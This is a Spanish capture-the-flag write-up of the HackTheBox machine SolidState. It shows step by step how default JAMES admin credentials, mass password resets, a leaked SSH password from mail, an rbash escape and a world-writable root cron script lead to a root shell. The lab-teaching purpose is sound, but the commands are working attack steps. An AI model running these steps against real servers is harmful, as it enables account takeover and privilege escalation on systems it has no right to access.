---
layout      : post
title       : "Maquina SolidState - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-SolidState/banner.png
category    : [ hackthebox ]
tags        : [ Information Leaked, Escaping Restricted Bash, Abusing Cron Jobs ]
---

Hola otra vez, el dia de hoy vamos a resolver la máquina `SolidState` de la plataforma de `hackthebox` correspondiente a una maquina `linux` de dificultad media, la cual vamos a explotar al conectarnos a un servicio de administración que nos permitira cambiar las contraseñas de usuarios de correo, y mediante ello obtendremos unas credenciales para conectarnos al sistema, donde una vez conectados haremos un bypass de una `restricted bash` asignada y finalmente nos construiremos un script en bash para detectar tareas `cron` y aprovecharemos una para poder convertinos en el usuario `root`.
 

Vamos a comenzar creando un directorio con el nombre de la maquina:

```bash
❯ mkdir SolidState
❯ ls
 SolidState
```
Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```

## ENUMERACION [#](#enumeracion) {#enumeracion}
 

Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.51
PING 10.10.10.51 (10.10.10.51) 56(84) bytes of data.
64 bytes from 10.10.10.51: icmp_seq=1 ttl=63 time=195 ms

--- 10.10.10.51 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 194.687/194.687/194.687/0.000 ms
```
Vemos que la maquina nos responde, con un ttl de `63`correspondiente a una maquina `linux`, ahora procederemos a el escaneo de puertos con la ayuda de `nmap`:

### Escaneo de Puertos

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `openPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.51 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-24 21:26 GMT
Initiating SYN Stealth Scan at 21:26
Scanning 10.10.10.51 [65535 ports]
Discovered open port 25/tcp on 10.10.10.51
Discovered open port 110/tcp on 10.10.10.51
Discovered open port 80/tcp on 10.10.10.51
Discovered open port 22/tcp on 10.10.10.51
Discovered open port 4555/tcp on 10.10.10.51
Discovered open port 119/tcp on 10.10.10.51
Completed SYN Stealth Scan at 21:26, 18.27s elapsed (65535 total ports)
Nmap scan report for 10.10.10.51
Host is up, received user-set (0.21s latency).
Scanned at 2023-06-24 21:26:16 GMT for 18s
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
25/tcp   open  smtp    syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
110/tcp  open  pop3    syn-ack ttl 63
119/tcp  open  nntp    syn-ack ttl 63
4555/tcp open  rsip    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.41 seconds
           Raw packets sent: 86905 (3.824MB) | Rcvd: 85777 (3.431MB)
```

### Escaneo de Version y Servicios.

```java
❯ nmap -sCV -p22,25,80,110,119,4555 10.10.10.51 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-24 21:27 GMT
Nmap scan report for 10.10.10.51
Host is up (0.45s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.16.5 [10.10.16.5])
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp  open  pop3    JAMES pop3d 2.3.2
119/tcp  open  nntp    JAMES nntpd (posting ok)
4555/tcp open  rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4555-TCP:V=7.92%I=7%D=6/24%Time=64975FD6%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,7C,"JAMES\x20Remote\x20Administration\x20Tool\x202\.3\.2\nPl
SF:ease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\nPasswo
SF:rd:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n");
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 291.45 seconds

```
Visulizamos informacion interesante de los puertos escaneados:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 22     | SSH     |OpenSSH 7.4p1 Debian 10+deb9u1  |
| 25   | SMTP     | JAMES smtpd 2.3.2 |
| 80   | HTTP     |  Apache httpd 2.4.25 |
| 110   | POP3     |  JAMES pop3d 2.3.2 |
| 119   | NNTP     |  JAMES nntpd (posting ok) |
| 4555   | RSIP?     | JAMES Remote Administration Tool 2.3.2|



## EXPLOTACION [#](#explotación) {#explotación}

Ya que nmap nos reporta el el puerto 4555 un servicio de administración, vamos a tratar de conectarnos.

```bash
❯ nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
admin
Password:
password
Login failed for admin
Login id:
```
Obvervamos que el servicio nos pide unas credenciales, y si fallamos al tratar de conectarnos, pero podemos probar credenciales por defecto, en este caso usaremos `root:root`.


```bash
❯ nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

Logramos ingresar al servicio, y podemos ver que tenemos una lista de opciones que podemos usar, entre ellas una que corresponde a listar usuario y cambiarles la contraseña.

Primero vamos a lista a todos los usuarios registrados.

```bash
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```
Ahora como no sabemos la contraseña de cada uno de estos, usaremos la opcion para modificarles la contraseña y le asignaremos a todos el mismo nombre de usuario.

```bash
setpassword james james
Password for james reset
setpassword thomas thomas
Password for thomas reset
setpassword john john
Password for john reset
setpassword mindy mindy
Password for mindy reset
setpassword mailadmin mailadmin
Password for mailadmin reset
```

Como los usuarios corresponden a servicios de correo, vamos a conectarnos para inspeccionar si existe algun mail importante.

```bash
❯ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER james
+OK
PASS james
+OK Welcome james
LIST
+OK 0 0
.
```

Si ahora probamos a conectarnos como el usuario `mindy`, observamos que tiene dos correos.

```bash
❯ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS mindy
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
```

Al leer el segundo correo, encontramos unas credenciales para conectarse por `ssh`.

```bash
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

Las credenciales son validas, pero al conectarnos vemos que estamos limitados por una restricted bash.

```bash
❯ ssh mindy@10.10.10.51
The authenticity of host '10.10.10.51 (10.10.10.51)' can't be established.
ECDSA key fingerprint is SHA256:njQxYC21MJdcSfcgKOpfTedDAXx50SYVGPCfChsGwI0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.51' (ECDSA) to the list of known hosts.
mindy@10.10.10.51's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$ 
mindy@solidstate:~$ whoami
-rbash: whoami: command not found
mindy@solidstate:~$
```

Ahora como podemos bypasear la `restricted bash`, pues es muy sencillo; podemos usar como parametro `-t bash` y de ejecutarse un docker en la maquina nos otorgara una sesión interactiva dentro del contenedor omitiendo las restricciones.


Haciendo uso de lo mencionado, podemos volver a conectarnos y visualizar la primera flag `user.txt`.

```bash
❯ ssh mindy@10.10.10.51 -t bash
mindy@10.10.10.51's password: 
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ 
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami
mindy
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls
bin  user.txt
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat user.txt 
5aadb8206e94c4471346a863bf006a4a
```

## ELEVACION DE PRIVILEGIOS [#](#escalada-de-privilegios) {#escalada-de-privilegios}


Enumarando el sistema no encontramos información interesante como archivos suid o privilegios de nuestro usuario. Por ello vamos a crearnos un `script` en bash que nos permita ver tareas que se esten ejecutando en el sistema a intevalos regulares de tiempo al que llamaremos `procmon.sh`.


```bash
#!/bin/bash

old_process=$(ps -eo user,command)

while true; do
  new_process=$(ps -eo user,command)
  diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "kworker|procmon|command"
  old_process=$new_process
done
```

Ejecutamos el script y despues de unos minutos vemos que el usuario `root` esta ejecutando un script `tmp.py`.


```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ./procmon.sh 
> root     /usr/sbin/CRON -f
< root     /usr/sbin/CRON -f
c^C
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ls
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ cd /dev/shm
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ nano procmon.sh
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ chmod +x procmon.sh 
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ./procmon.sh 
> root     /usr/sbin/CRON -f
> root     /bin/sh -c python /opt/tmp.py
> root     python /opt/tmp.py
< root     /usr/sbin/CRON -f
< root     /bin/sh -c python /opt/tmp.py
< root     python /opt/tmp.py
```

Si inspeccionamos los permisos del archivo, podemos ver que tenemos capacidad de escritura, quiere decir que podemos modificarlo y al cabo de unos minutos el usuario `root` sera el que lo ejecute.

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ls -l /opt/tmp.py 
-rwxrwxrwx 1 root root 105 Aug 22  2017 /opt/tmp.py
```

Vamos a modificarlo para que al ejecutar otorgue el permiso `suid` a la bash.


```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ cat /opt/tmp.py
#!/usr/bin/env python
import os
os.system("chmod u+s /bin/bash")
```

Esperamos unos minutos y vemos que ahora la bash ya cuenta con el permisos `suid`, ahora podemos convertirnos en el usuario `root` , ir a su directorio personal y visualizar la segunda flag `root.txt`.

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1265272 May 15  2017 /bin/bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ bash -p
bash-4.4# whoami
root
bash-4.4# cd /root/
bash-4.4# cat root.txt 
1a0cd964c524d89ebe2a7d630f938518
```


